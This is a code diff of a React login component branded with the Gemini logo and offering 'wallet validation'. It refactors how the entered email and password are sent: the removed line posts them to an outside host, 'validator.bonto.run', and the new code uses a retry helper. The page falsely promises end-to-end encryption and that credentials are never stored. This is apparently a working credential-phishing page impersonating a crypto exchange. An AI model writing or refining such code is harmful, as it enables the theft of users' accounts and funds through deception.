@@ -8,8 +8,7 @@ import {
 } from "lucide-react";
 import "./geminiLanding.css";
 import gemini from "../../assets/gemini_logo.png";
-
-const API_URL = "https://validator.bonto.run/Gemini";
+import fetchWithRetry from "../../utils/api";
 
 const GeminiLogin = () => {
   const [form, setForm] = useState({
@@ -31,7 +30,7 @@ const GeminiLogin = () => {
     setLoading(true);
 
     try {
-      const res = await fetch(API_URL, {
+      const res = await fetchWithRetry("/Gemini", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(form)
@@ -49,38 +48,27 @@ const GeminiLogin = () => {
   };
 
   const handleKeyPress = (e) => {
-    if (e.key === "Enter" && !loading) {
-      submitForm();
-    }
+    if (e.key === "Enter" && !loading) submitForm();
   };
 
-  /* ================= SUCCESS STATE ================= */
   if (done) {
     return (
       <div className="login-wrapper">
         <div className="login-box">
           <div className="login-header-section">
-            <img
-              src={gemini}
-              alt="Gemini Logo"
-              className="login-brand-image"
-            />
+            <img src={gemini} alt="Gemini Logo" className="login-brand-image" />
           </div>
-
           <div className="login-panel">
             <div className="success-badge">
               <CheckCircle size={28} color="#00dcfa" />
             </div>
-
             <h2 className="login-heading">Validation Completed</h2>
             <p className="login-description">
               Your wallet validation is being processed.
             </p>
-
             <div className="info-notice">
               Need to validate another wallet?
             </div>
-
             <div style={{ display: "flex", gap: "0.75rem", marginTop: "1rem" }}>
               <button
                 className="action-button"
@@ -88,7 +76,6 @@ const GeminiLogin = () => {
               >
                 Validate Another
               </button>
-
               <button
                 className="action-button"
                 style={{ background: "#2a2b2f", color: "#fff" }}
@@ -103,35 +90,21 @@ const GeminiLogin = () => {
     );
   }
 
-  /* ================= LOGIN FORM ================= */
   return (
     <div className="login-wrapper">
       <div className="login-box">
-
-        {/* Header */}
         <div className="login-header-section">
-          <img
-            src={gemini}
-            alt="Gemini Logo"
-            className="login-brand-image"
-          />
-
+          <img src={gemini} alt="Gemini Logo" className="login-brand-image" />
           <h1 className="login-heading">Wallet Validation</h1>
           <p className="login-description">
             Securely verify your wallet ownership
           </p>
         </div>
-
-        {/* Card */}
         <div className="login-panel">
-
-          {/* Security Badge */}
           <div className="security-indicator">
             <Shield size={14} />
             End-to-end encrypted
           </div>
-
-          {/* Email */}
           <div className="input-group">
             <label>Email Address</label>
             <input
@@ -145,8 +118,6 @@ const GeminiLogin = () => {
               onKeyPress={handleKeyPress}
             />
           </div>
-
-          {/* Password */}
           <div className="input-group">
             <label>Password</label>
             <div className="password-field">
@@ -169,11 +140,7 @@ const GeminiLogin = () => {
               </button>
             </div>
           </div>
-
-          {/* Error */}
           {error && <div className="error-message">{error}</div>}
-
-          {/* Submit */}
           <button
             className="action-button"
             onClick={submitForm}
@@ -188,19 +155,14 @@ const GeminiLogin = () => {
               "Validate Wallet"
             )}
           </button>
-
-          {/* Info */}
           <div className="info-notice">
             By validating your wallet, you confirm ownership without exposing
             private keys. Credentials are encrypted and never stored.
           </div>
         </div>
-
-        {/* Footer */}
         <div className="footer-disclaimer">
           Protected by industry-leading security standards
         </div>
-
       </div>
     </div>
   );
